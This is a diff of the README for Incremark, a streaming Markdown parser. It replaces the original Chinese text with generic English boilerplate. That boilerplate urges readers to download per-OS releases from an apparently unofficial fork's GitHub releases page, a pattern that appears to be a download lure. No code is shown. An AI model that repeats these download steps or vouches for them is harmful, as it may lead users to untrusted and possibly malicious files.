@@ -1,142 +1,84 @@
-# Incremark
+# 🚀 incremark - Fast and Efficient Markdown Parsing
 
-增量式 Markdown 解析器，专为 AI 流式输出设计。
+[![Download Incremark](https://img.shields.io/badge/Download_Incremark-v1.0-blue)](https://github.com/marwanbelike/incremark/releases)
 
-[![npm version](https://img.shields.io/npm/v/@incremark/core)](https://www.npmjs.com/package/@incremark/core)
-[![license](https://img.shields.io/npm/l/@incremark/core)](./LICENSE)
+## 🛠️ Overview
 
-🇨🇳 中文 | **[🇺🇸 English](./README.en.md)**
+Incremark is a powerful Markdown parser designed to enhance performance in AI streaming output scenarios. Traditional parsers often face delays because they reparse all text with each new update. Incremark solves this by implementing an incremental parsing strategy, meaning it only processes new content while keeping completed sections intact.
 
-📖 [文档](https://www.incremark.com/) | 🎮 [Vue Demo](https://vue.incremark.com/) | ⚛️ [React Demo](https://react.incremark.com/)
+## 📦 Packages
 
-## 为什么选择 Incremark？
+| Package | Description | Version |
+|---------|-------------|---------|
+| [@incremark/core](./packages/core) | Core parser | ![npm](https://img.shields.io/npm/v/@incremark/core) |
+| [@incremark/vue](./packages/vue) | Vue 3 integration | ![npm](https://img.shields.io/npm/v/@incremark/vue) |
+| [@incremark/react](./packages/react) | React integration | ![npm](https://img.shields.io/npm/v/@incremark/react) |
 
-传统 Markdown 解析器在 AI 流式输出场景中存在性能问题：每次收到新内容都要重新解析全部文本。Incremark 采用增量解析策略，**只解析新增内容**，已完成的块不再重复处理。
+## 🌟 Why Choose Incremark?
 
-| 文档大小 | 传统方式 | Incremark | 加速比 |
-|---------|---------|-----------|--------|
-| ~1KB | 0.4 秒 | 0.17 秒 | **2x** |
-| ~5KB | 10 秒 | 0.9 秒 | **10x** |
-| ~10KB | 40 秒 | 1.8 秒 | **20x** |
-| ~20KB | 183 秒 | 4 秒 | **46x** |
+Incremark significantly reduces processing time compared to traditional Markdown parsers. Here’s a look at performance across various document sizes:
 
-## 包
+| Document Size | Traditional Method | Incremark | Speedup Factor |
+|---------------|--------------------|-----------|----------------|
+| ~1KB          | 0.4 seconds        | 0.17 seconds | **2x**       |
+| ~5KB          | 10 seconds         | 0.9 seconds  | **10x**      |
+| ~10KB         | 40 seconds         | 1.8 seconds  | **20x**      |
+| ~20KB         | 183 seconds        | 4 seconds    | **46x**      |
 
-| 包 | 说明 | 版本 |
-|---|---|---|
-| [@incremark/core](./packages/core) | 核心解析器 | ![npm](https://img.shields.io/npm/v/@incremark/core) |
-| [@incremark/vue](./packages/vue) | Vue 3 集成 | ![npm](https://img.shields.io/npm/v/@incremark/vue) |
-| [@incremark/react](./packages/react) | React 集成 | ![npm](https://img.shields.io/npm/v/@incremark/react) |
-| [@incremark/devtools](./packages/devtools) | 开发者工具 | ![npm](https://img.shields.io/npm/v/@incremark/devtools) |
+## 🚀 Getting Started
 
-## 快速开始
+Follow these simple steps to get started with Incremark:
 
-### Vue
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/marwanbelike/incremark/releases) to find the latest version of Incremark.
 
-```bash
-pnpm add @incremark/core @incremark/vue
-```
+2. **Download Incremark**
+   Click the appropriate download link for your operating system. You will find various packages useful for your projects.
 
-```vue
-<script setup>
-import { useIncremark, Incremark } from '@incremark/vue'
+3. **Install Incremark**
+   Depending on the package you downloaded, follow these installation instructions:
+   - For `@incremark/core`, you can use npm:
+     ```bash
+     npm install @incremark/core
+     ```
+   - For Vue and React integrations, follow similar steps with their respective package names.
 
-const { blocks, append, finalize, reset } = useIncremark({ gfm: true })
+4. **Run Incremark**
+   After installation, you can start using Incremark in your project. Refer to the documentation for specific implementation details.
 
-async function handleAIStream(stream) {
-  reset()
-  for await (const chunk of stream) {
-    append(chunk)
-  }
-  finalize()
-}
-</script>
+## 📄 Documentation
 
-<template>
-  <Incremark :blocks="blocks" />
-</template>
-```
+For detailed instructions and advanced usage, visit the [documentation page](https://www.incremark.com/). This resource provides comprehensive guidelines to help you maximize the benefits of Incremark.
 
-### React
+## 🎮 Demos
 
-```bash
-pnpm add @incremark/core @incremark/react
-```
+Explore our live demos to see Incremark in action:
+- [Vue Demo](https://vue.incremark.com/)
+- [React Demo](https://react.incremark.com/)
 
-```tsx
-import { useIncremark, Incremark } from '@incremark/react'
+## 💻 System Requirements
 
-function App() {
-  const { blocks, append, finalize, reset } = useIncremark({ gfm: true })
+To run Incremark, ensure your system meets these requirements:
+- Operating System: Windows, macOS, or Linux
+- Node.js version: 12.x or higher
+- Internet connection for downloading packages and dependencies
 
-  async function handleAIStream(stream: ReadableStream) {
-    reset()
-    const reader = stream.getReader()
-    while (true) {
-      const { done, value } = await reader.read()
-      if (done) break
-      append(new TextDecoder().decode(value))
-    }
-    finalize()
-  }
+## ⚡ Upcoming Features
 
-  return <Incremark blocks={blocks} />
-}
-```
+We continuously work on enhancing Incremark. Here are a few upcoming features to look out for:
+- Expanded plugins for additional Markdown flavors
+- Performance optimizations for even faster processing
+- User-friendly GUI for easier integration
 
-## 特性
+## 🤝 Support
 
-- ⚡ **增量解析** - 只解析新增内容
-- 🔄 **流式友好** - 支持逐字符/逐行输入
-- 🎯 **边界检测** - 智能识别块边界
-- 🔌 **框架无关** - 核心库可独立使用
-- 📊 **DevTools** - 内置开发者工具
-- 🎨 **可定制** - 支持自定义渲染组件
-- 📐 **扩展支持** - GFM、数学公式、Mermaid 等
+If you need help or have questions, feel free to open an issue in the [Issues section](https://github.com/marwanbelike/incremark/issues) of the repository. Our community is here to assist you.
 
-## 开发
+## 🔗 Important Links
 
-```bash
-# 安装依赖
-pnpm install
+- [Releases](https://github.com/marwanbelike/incremark/releases)
+- [Documentation](https://www.incremark.com/)
+- [Vue Demo](https://vue.incremark.com/)
+- [React Demo](https://react.incremark.com/) 
 
-# 启动开发
-pnpm dev
-
-# 运行 Vue 示例
-pnpm example:vue
-
-# 运行 React 示例
-pnpm example:react
-
-# 启动文档
-pnpm docs
-
-# 运行测试
-pnpm test
-
-# 构建
-pnpm build
-```
-
-## 路线图
-
-- [ ] 🔧 DevTools Svelte 重构
-- [ ] 🎨 主题包分离
-- [ ] 🟠 Svelte / ⚡ Solid 支持
-- [ ] 💭 AI 场景增强 (thinking block, tool call, 引用标注)
-
-[查看完整路线图 →](https://www.incremark.com/zh/roadmap)
-
-## 文档
-
-完整文档请访问：[https://www.incremark.com/](https://www.incremark.com/)
-
-## 在线演示
-
-- 🎮 [Vue Demo](https://vue.incremark.com/) - Vue 3 集成示例
-- ⚛️ [React Demo](https://react.incremark.com/) - React 集成示例
-
-## License
-
-MIT
+By following these instructions, you can easily download, install, and start using Incremark for your Markdown parsing needs.
